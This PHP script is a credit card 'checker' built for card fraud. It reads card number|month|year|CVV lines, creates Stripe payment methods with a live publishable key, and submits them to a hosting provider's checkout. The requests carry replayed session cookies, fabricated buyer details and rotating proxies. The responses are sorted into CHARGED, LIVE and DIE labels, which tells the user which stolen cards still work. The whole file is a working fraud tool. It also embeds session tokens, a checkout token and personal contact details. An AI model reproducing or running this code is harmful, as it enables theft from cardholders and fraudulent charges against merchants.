
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://digivps.com/billing/cart.php?a=checkout&e=false" ;
$amt = "$7.99" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=5d7205d6-322f-4051-ae77-a7515dc726ecf6a4ab&muid=d2614527-afe2-4554-98d1-ce47fa86192a249db1&sid=b44b2e3f-32f7-451d-9bef-4917bcbf1bdc1ae33a&pasted_fields=number&payment_user_agent=stripe.js%2F047a5472e%3B+stripe-js-v3%2F047a5472e&time_on_page=45570&key=pk_live_51HgGEqBc612uk8sXmiF1Nsm0RyktcbsoqWqfaYuxjcfu5N1NAVPvZJluStxy5AZsPKDQVL8qhoIUQ17oBmqjiy7W0004ywEGGI');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://client.zainhosting.com/index.php?rp=/stripe/payment/intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: client.zainhosting.com',
'method: POST',
'path: /index.php?rp=/stripe/payment/intent',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9,ar;q=0.8',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: WHMCSaZKvlFujcYMN=57ed5e37ec2e8f5b47261233166f648d; __utma=248794453.464212648.1675950084.1675950084.1675950084.1; __utmc=248794453; __utmz=248794453.1675950084.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; crisp-client%2Fsession%2F8e3f288c-1cf7-4723-93d1-794cbbe956ca=session_48c53c7c-1345-43bb-b439-eb4a7957ed42; __stripe_mid=d2614527-afe2-4554-98d1-ce47fa86192a249db1; __stripe_sid=b44b2e3f-32f7-451d-9bef-4917bcbf1bdc1ae33a; crisp-client%2Fsocket%2F8e3f288c-1cf7-4723-93d1-794cbbe956ca=1; __utmb=248794453.5.10.1675950084',
'origin: https://client.zainhosting.com',
'referer: https://client.zainhosting.com/cart.php?a=checkout&e=false',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'token=a998eab6374a64720c69b2bd7ea1a6b0e12a5f4c&submit=true&custtype=new&loginemail=&loginpassword=&firstname=Sidali&lastname=Vda&email=lmgotku%40eurokool.com&country-calling-code-phonenumber=1&phonenumber=310-752-9938&companyname=Sidra&address1=9233+W+Pico+Blvd+%23101&address2=&city=Los+Angeles&state=California&postcode=90035&country=US&customfield%5B1%5D=&password=%258RkvqiIht%7DE&password2=%258RkvqiIht%7DE&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&marketingoptin=1&accepttos=on&payment_method_id='.$id.'');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅Sido  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅Sido  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅Sido  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅Sido  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅Sido  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅Sido  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅Sido   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅Sido   </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅Sido  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅Sido </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅Sido   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅Sido  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅Sido  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>